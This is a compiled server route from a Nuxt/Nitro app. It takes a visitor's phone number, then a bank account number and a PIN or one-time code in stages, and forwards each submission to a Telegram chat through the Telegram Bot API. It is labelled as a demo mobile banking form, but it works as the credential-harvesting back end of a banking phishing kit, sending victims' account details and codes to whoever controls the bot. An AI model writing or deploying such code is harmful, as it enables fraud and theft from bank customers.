globalThis.__timing__.logStart('Load chunks/routes/api/telegram-demo.post');import { d as defineEventHandler, u as useRuntimeConfig, r as readBody, c as createError } from '../../nitro/nitro.mjs';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';

const telegramDemo_post = defineEventHandler(async (event) => {
  var _a, _b;
  try {
    const config = useRuntimeConfig();
    const body = await readBody(event);
    if (!config.telegramBotToken || !config.telegramChatId) {
      throw createError({
        statusCode: 500,
        statusMessage: "Telegram configuration is missing"
      });
    }
    const phone = ((body == null ? void 0 : body.phone) || "").trim();
    const referenceNumber = ((body == null ? void 0 : body.referenceNumber) || "").trim();
    const otpCode = ((body == null ? void 0 : body.otpCode) || "").trim();
    const stage = (body == null ? void 0 : body.stage) || "phone";
    if (!phone) {
      throw createError({
        statusCode: 400,
        statusMessage: "Phone number is required"
      });
    }
    let text = [
      "Demo mobile banking form submission",
      `Stage: ${stage}`,
      `Phone: ${phone}`
    ];
    if (stage === "reference") {
      if (!referenceNumber) {
        throw createError({
          statusCode: 400,
          statusMessage: "Reference number is required"
        });
      }
      text.push(`Account Number: ${referenceNumber}`);
      text.push(`PIN Code: ${otpCode || "not provided"}`);
    }
    const response = await $fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`, {
      method: "POST",
      body: {
        chat_id: config.telegramChatId,
        text: text.join("\n")
      }
    });
    return {
      ok: response.ok
    };
  } catch (error) {
    console.error("Telegram send failed:", {
      message: error == null ? void 0 : error.message,
      statusCode: error == null ? void 0 : error.statusCode,
      statusMessage: error == null ? void 0 : error.statusMessage,
      data: error == null ? void 0 : error.data,
      cause: ((_a = error == null ? void 0 : error.cause) == null ? void 0 : _a.message) || (error == null ? void 0 : error.cause)
    });
    throw createError({
      statusCode: 500,
      statusMessage: ((_b = error == null ? void 0 : error.data) == null ? void 0 : _b.description) || (error == null ? void 0 : error.statusMessage) || "Telegram request failed"
    });
  }
});

export { telegramDemo_post as default };;globalThis.__timing__.logEnd('Load chunks/routes/api/telegram-demo.post');
//# sourceMappingURL=telegram-demo.post.mjs.map
